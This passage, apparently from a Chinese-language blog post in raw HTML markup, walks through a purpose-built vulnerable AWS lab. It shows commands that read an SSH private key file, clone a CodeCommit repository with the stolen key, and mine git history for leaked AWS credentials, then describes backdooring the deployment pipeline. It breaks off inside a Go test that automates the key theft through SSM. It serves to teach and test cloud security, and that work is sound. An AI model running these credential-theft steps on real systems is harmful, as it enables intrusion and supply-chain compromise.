&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1001&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ssm-user&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1001&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ssm-user&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1001&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ssm-user&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;在用户的主目录下，我们找到一个SSH私钥：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ cat .ssh/id_rsa
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-----BEGIN RSA PRIVATE KEY-----
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;MIIEpAIBAAKCAQEApn/Tcy
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;通过将其指纹与账户中其他IAM用户关联的SSH公钥进行比较，我们注意到被盗的私钥属于名为&lt;code&gt;cloner&lt;/code&gt;的IAM用户：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ ssh-keygen -f .ssh/stolen_key -l -E md5
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; MD5:be:5e:49:5e:e5:d0:66:bb:91:30:3f:66:2e:97:1a:11
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ aws iam list-ssh-public-keys --user-name cloner
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s2&#34;&gt;&amp;#34;SSHPublicKeys&amp;#34;&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;UserName&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;cloner&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;SSHPublicKeyId&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;APKA254BBSGPK2B5K5YQ&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;Status&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;Active&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s2&#34;&gt;&amp;#34;UploadDate&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;2021-12-27T10:34:19+00:00&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ aws iam get-ssh-public-key --user-name cloner --ssh-public-key-id APKA254BBSGPK2B5K5YQ --encoding PEM --output text --query &lt;span class=&#34;s1&#34;&gt;&amp;#39;SSHPublicKey.Fingerprint&amp;#39;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;be:5e:49:5e:e5:d0:66:bb:91:30:3f:66
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;该用户恰好拥有对CodeCommit仓库的&lt;code&gt;codecommit:GitPull&lt;/code&gt;权限。使用CodeCommit文档，我们可以将仓库克隆到本地机器：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chmod &lt;span class=&#34;m&#34;&gt;700&lt;/span&gt; .ssh/stolen_key
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;AWS_REGION&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;us-east-1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;sshKeyId&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;aws iam list-ssh-public-keys --user-name cloner --output text --query &lt;span class=&#34;s1&#34;&gt;&amp;#39;SSHPublicKeys[0].SSHPublicKeyId&amp;#39;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat &amp;gt;&amp;gt; .ssh/config &lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt;EOF
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;Host *.amazonaws.com
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;	IdentityFile ~/.ssh/stolen_key
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone ssh://&lt;span class=&#34;nv&#34;&gt;$sshKeyId&lt;/span&gt;@git-codecommit.&lt;span class=&#34;nv&#34;&gt;$AWS_REGION&lt;/span&gt;.amazonaws.com/v1/repos/backend-api
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;现在我们有了应用程序的源代码！&lt;/p&gt;
&lt;p&gt;源代码中没有什么有趣的内容。然而，如果我们查看Git提交历史，有一个提交引起了我们的注意：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;39ac1aa (HEAD -&amp;gt; master, origin/master, origin/HEAD) Added app.py
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;88055fb Added requirements.txt
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;bdf59bb Added Dockerfile
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;f1cb341 Use built-in AWS authentication instead of hardcoded keys
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;70f0181 Added buildspec.yml
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;分析这个提交的差异（&lt;code&gt;git show f1cb341&lt;/code&gt;）揭示了一些泄露的AWS凭证！&lt;/p&gt;
&lt;p&gt;使用这些凭证验证AWS时，我们注意到我们刚刚攻陷了IAM用户&lt;code&gt;developer&lt;/code&gt;的凭证，该用户拥有&lt;code&gt;codecommit:GitPush&lt;/code&gt;和&lt;code&gt;codecommit:PutFile&lt;/code&gt;权限。&lt;/p&gt;
&lt;p&gt;我们现在可以使用CodeCommit UI来后门应用程序，并等待持续部署管道将其部署到生产环境！例如，我们可以让应用程序将秘密数据记录到其日志（CloudWatch日志组&lt;code&gt;/aws/lambda/backend-api&lt;/code&gt;）中。我们也可以后门应用程序，让它在每个请求上将秘密数据发送到远程、攻击者控制的服务器——或者不修改应用程序代码，而是后门Docker镜像本身。&lt;/p&gt;
&lt;p&gt;一旦我们执行了恶意提交，CodePipeline管道就会获取我们的更改并开始将其推出到生产环境：&lt;/p&gt;
&lt;p&gt;几分钟后，我们成功地后门了应用程序并捕获了标志！&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;START RequestId: 3bd6cd1e-9e01-4012-859d-70c9fcd9d643 Version: $LATEST
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;superSecretData=FLAG{SupplyCh4!nS3curityM4tt3r5&amp;#34;}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;END RequestId: 3bd6cd1e-9e01-4012-859d-70c9fcd9d643
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;使用端到端测试进行持续测试&#34;&gt;使用端到端测试进行持续测试
&lt;/h2&gt;&lt;p&gt;如前所述，该场景基于Terraform代码，负责创建VPC、EC2实例、管道等。Terraform代码并不简单。我们如何高度自信地认为它持续按预期工作？回想一下，在我们的上下文中，&amp;ldquo;工作&amp;quot;意味着处于可以通过预期步骤利用的状态。&lt;/p&gt;
&lt;p&gt;我们利用了Terratest，这是一个用于测试Terraform代码的Go库。更具体地说，我们编写了如下工作的Go测试：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用Terratest运行我们的Terraform代码，针对实时AWS环境。资源实际部署到AWS。&lt;/li&gt;
&lt;li&gt;从我们的Go测试中，向FooCorp API发送实际的HTTP请求，以确保它已正确部署。&lt;/li&gt;
&lt;li&gt;仍然从我们的Go测试中，以编程方式执行漏洞利用步骤，一步一步来。&lt;/li&gt;
&lt;li&gt;测试完成后，销毁我们通过Terraform代码配置的基础设施。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;然后我们可以使用&lt;code&gt;go test&lt;/code&gt;运行我们的测试，可以手动运行，也可以在每次拉取请求时自动运行。以下是&amp;quot;以代码形式存在的漏洞利用步骤&amp;quot;的样子：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;test&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;EndToEndTest&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;StealPrivateSSHKey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;instanceId&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// 在实例上执行SSM命令以窃取SSH私钥&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;ssmClient&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ssm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;NewFromConfig&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;awsConfig&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ssmClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;SendCommand&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;TODO&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ssm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;SendCommandInput&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;DocumentName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;aws&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;AWS-RunShellScript&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;InstanceIds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;instanceId&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;Parameters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;map&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][]&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;s&#34;&gt;&amp;#34;commands&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;cat /home/ssm-user/.ssh/id_rsa&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;assert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Nil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Unable to send SSM command to instance&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;c1&#34;&gt;// 等待SSM命令的输出&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nx&#34;&gt;commandOutput&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ssm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;NewCommandExecutedWaiter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ssmClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;WaitForOutput&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;TODO&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;ssm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;GetCommandInvocationInput&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
